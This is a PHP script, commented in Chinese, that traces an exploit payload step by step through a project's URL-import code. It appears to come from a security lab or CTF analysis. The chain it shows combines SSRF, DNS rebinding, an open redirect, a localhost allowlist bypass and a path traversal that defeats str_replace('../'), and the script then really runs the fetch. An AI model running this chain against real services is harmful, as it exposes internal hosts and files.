<?php
/**
 * Payload 单步追踪器：require 项目真实源码，逐步打印变量值
 * 用法: php trace_payload.php "<完整payload>"
 */
require __DIR__ . '/../source/src/config.php';
require __DIR__ . '/../source/src/import_service.php';

$sourceUrl = $argv[1];
$line = fn($s) => print($s . "\n");

$line('════════════════ 用户输入 ════════════════');
$line('$sourceUrl = ' . $sourceUrl);
$line('');

$line('════════════════ 第1关：parse_url 拆 URL ════════════════');
$parts = parse_url($sourceUrl);
$line('$parts = ' . json_encode($parts, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT));

$scheme = strtolower((string) $parts['scheme']);
$line('$scheme = strtolower("' . $parts['scheme'] . '") = "' . $scheme . '"');
$line('in_array($scheme, ["http","https"]) → ' . (in_array($scheme, ['http', 'https'], true) ? 'true ✅ 通过' : 'false ❌'));
$line('');

$line('════════════════ 第2关：端口白名单 ════════════════');
$portErr = validate_import_port($parts, $scheme);
$line('$parts["port"] = ' . var_export($parts['port'] ?? null, true) . '（http 白名单: [80, 8080]）');
$line('validate_import_port() → ' . ($portErr === null ? 'null ✅ 通过' : '"' . $portErr . '" ❌'));
$line('');

$line('════════════════ 第3关：主机名处理 + localhost 检查 ════════════════');
$host = normalize_import_host((string) $parts['host']);
$line('$host = normalize_import_host("' . $parts['host'] . '") = "' . $host . '"');
$line('strcasecmp($host, "localhost") → ' . (strcasecmp($host, 'localhost') === 0 ? '0 ❌ 是localhost' : '非0 ✅ 不是'));
$line('');

$line('════════════════ 第4关：DNS解析 + IP黑名单（校验时刻） ════════════════');
$err = validate_import_url($sourceUrl);
$line('>>> validate_import_url($sourceUrl) = ' . var_export($err, true));
$line('    （内部完成 DNS 第1次查询 → 得到公网 IP → is_blocked_ip 放行）');
$line('');

$line('════════════════ 第5关：抓取时刻（Rebinding 掉包） ════════════════');
$fetchIp = gethostbyname($host);
$line('【DNS 第2次查询】gethostbyname("' . $host . '") = ' . $fetchIp);
$line('对比两次查询：校验时 = 公网IP，抓取时 = ' . $fetchIp);
$line('is_blocked_ip("93.184.216.34") → ' . (is_blocked_ip('93.184.216.34') ? 'true' : 'false（所以校验放行）'));
$line('is_blocked_ip("' . $fetchIp . '") → ' . (is_blocked_ip($fetchIp) ? 'true（但此刻已无人检查！）' : 'false'));
$line('file_get_contents() 将连接 ' . $fetchIp . ':8080 ...');
$line('');

$line('════════════════ 第6关：jump.php 内部（服务器B上执行） ════════════════');
$innerRaw = urldecode(parse_url($sourceUrl, PHP_URL_QUERY));
$line('jump.php 收到 $_GET["url"]（自动解码后）=');
$jumpQuery = parse_url($sourceUrl, PHP_URL_QUERY);
parse_str((string) $jumpQuery, $jumpParams);
$target = $jumpParams['url'] ?? '(解析失败)';
$line('    $target = "' . $target . '"');
$jumpParts = parse_url($target);
$line('    parse_url($target)["scheme"] = "' . ($jumpParts['scheme'] ?? '') . '" → 在白名单 ✅');
$line('    → 回 302 Location: ' . $target);
$line('    → file_get_contents 的 follow_location=1 自动跟随，且【不再校验】');
$line('');

$line('════════════════ 第7关：preview.php 内部（内网8081上执行） ════════════════');
$line('    $_SERVER["REMOTE_ADDR"] = "127.0.0.1"（服务器自己发的请求）→ 白名单 ✅ 通过');
parse_str((string) parse_url($target, PHP_URL_QUERY), $previewParams);
$file = $previewParams['file'] ?? '';
$line('    $file = "' . $file . '"');
$sanitized = str_replace('../', '', $file);
$line('    $sanitized = str_replace("../", "", $file)');
$line('             = "' . $sanitized . '"   ← 删掉旧../后，字符重新拼出新的../');
$target2 = '/var/cache/archive/' . ltrim($sanitized, '/');
$line('    $target = $baseDir . ltrim($sanitized, "/")');
$line('            = "' . $target2 . '"');
$line('    真实路径 = ' . (realpath($target2) ?: '(不存在)'));
$line('    is_file($target) → ' . (is_file($target2) ? 'true ✅ 文件存在' : 'false ❌'));
$line('');

$line('════════════════ 终点：include + 归档 ════════════════');
$line('include $target → 文件内容成为响应body → 存进归档库');
$line('');

$line('════════════════ 实测：真实执行抓取 ════════════════');
$result = fetch_remote_document($sourceUrl);
$line('$result["content_type"] = ' . $result['content_type']);
$line('$result["body"] = ');
$line('----------------------------------------');
$line($result['body']);
$line('----------------------------------------');
